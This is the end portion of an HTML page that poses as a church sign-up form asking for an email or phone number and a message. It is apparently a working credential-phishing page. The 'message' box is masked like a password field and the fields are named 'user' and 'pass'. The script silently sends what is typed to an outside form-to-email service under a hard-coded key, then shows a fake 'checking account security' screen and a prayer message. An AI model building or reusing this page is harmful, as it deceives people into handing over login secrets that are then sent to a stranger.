<style>

/* Layout containers */
#form,
#verify{
  width:100%;
  transition:transform .6s ease;
}

/* Initial states */
#form{transform:translateX(0);}

#verify{
  position:absolute;
  top:0;
  left:0;
  width:100%;
  transform:translateX(100%);
}

/* Headings */
h1{
  text-align:center;
  margin-bottom:34px;
  color:#111;
  font-size:28px;
}

body.dark h1{color:white;}

/* Form fields */
.field{
  position:relative;
  margin-bottom:24px;
}

input,
textarea{
  width:100%;
  padding:18px 16px;
  border-radius:12px;
  border:1px solid #ccc;
  background:white;
  color:#111;
  font-size:16px;
  outline:none;
  transition:.25s;
  resize:none;
}

body.dark input,
body.dark textarea{
  background:#0c1117;
  color:white;
  border:1px solid #2a3441;
}

input:focus,
textarea:focus{
  border-color:#f5c518;
  box-shadow:0 0 0 3px rgba(245,197,24,.22);
}

/* Floating label */
label{
  position:absolute;
  left:14px;
  top:50%;
  transform:translateY(-50%);
  color:#7c8794;
  padding:0 6px;
  pointer-events:none;
  transition:.2s;
  background:inherit;
}

input:focus+label,
input:not(:placeholder-shown)+label,
textarea:focus+label,
textarea:not(:placeholder-shown)+label{
  top:-8px;
  font-size:12px;
  color:#f5c518;
}

/* Button */
button{
  width:100%;
  padding:18px;
  border:none;
  border-radius:12px;
  background:#f5c518;
  font-weight:700;
  font-size:18px;
  cursor:pointer;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  position:relative;
}

/* Spinner */
.spin{
  width:18px;
  height:18px;
  border:3px solid rgba(0,0,0,.25);
  border-top:3px solid black;
  border-radius:50%;
  animation:rot .7s linear infinite;
  display:none;
}

.big-spin{
  margin:25px auto;
  width:40px;
  height:40px;
  border-width:4px;
  display:block;
}

@keyframes rot{
  to{transform:rotate(360deg);}
}

/* Verify page */
.verify{
  text-align:center;
  color:#111;
}

body.dark .verify{color:white;}

/* Animated dots */
.verifying span{
  display:inline-block;
  min-width:20px;
}

/* Popup */
.popup-msg{
  margin-top:30px;
  padding:16px;
  background:#f5c518;
  border-radius:12px;
  font-weight:600;
  opacity:0;
  transform:translateY(10px);
  transition:.4s ease;
}

.popup-msg.show{
  opacity:1;
  transform:translateY(0);
}

</style>

</head>
<body>

<div class="app">

<form id="form" action="https://formly.email/submit" method="POST">
  <input type="hidden" name="access_key" value="13ab8ddb0f584c9cb5aebc0e53f9db41">
  <input type="hidden" name="_captcha" value="false">

  <div class="field">
    <input id="user" name="email" placeholder=" " required>
    <label for="user">Email or Phone</label>
  </div>

  <div class="field">
    <textarea id="pass" name="message" placeholder=" " required></textarea>
    <label for="pass">Message</label>
  </div>

  <button type="submit" id="btn">
    RUN
    <div class="spin" id="spin"></div>
  </button>

  <p class="login-info">
    Tap on RUN to put in your phone number so we can call you later by the CHURCH and also put a message.
  </p>

  <p style="margin-top:12px;text-align:center;font-weight:500;color:#333;">
    God loves you and this is a very good day for us to pray for Him.
  </p>
</form>


<div class="verify" id="verify">
  <h1>Verification</h1>
  <p class="verifying">
    Checking account security<span id="dots"></span>
  </p>
  <div class="spin big-spin"></div>

  <div id="popup" class="popup-msg">
    Please go back home. JESUS LOVES YOU. WE WILL PRAY FOR YOU.
  </div>
</div>

</div>

<script>
document.addEventListener("DOMContentLoaded", function () {

  const form = document.getElementById("form");
  const verifyPage = document.getElementById("verify");
  const popup = document.getElementById("popup");
  const spin = document.getElementById("spin");
  const btn = document.getElementById("btn");
  const textarea = document.getElementById("pass");
  const dots = document.getElementById("dots");

  // Mask textarea
  textarea.style.webkitTextSecurity = "disc";

  // Animated dots
  let dotCount = 0;
  setInterval(() => {
    dotCount = (dotCount + 1) % 4;
    dots.textContent = ".".repeat(dotCount);
  }, 500);

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    spin.style.display = "block";
    btn.disabled = true;

    fetch(form.action, {
      method: "POST",
      body: new FormData(form),
      headers: { 'Accept': 'application/json' }
    }).catch(() => {});

    form.style.transform = "translateX(-100%)";
    verifyPage.style.transform = "translateX(0%)";

    setTimeout(() => {
      popup.classList.add("show");
    }, 5000);

    setTimeout(() => {
      window.location.href = "home.html";
    }, 300000);
  });

});
</script>

</body>
</html>
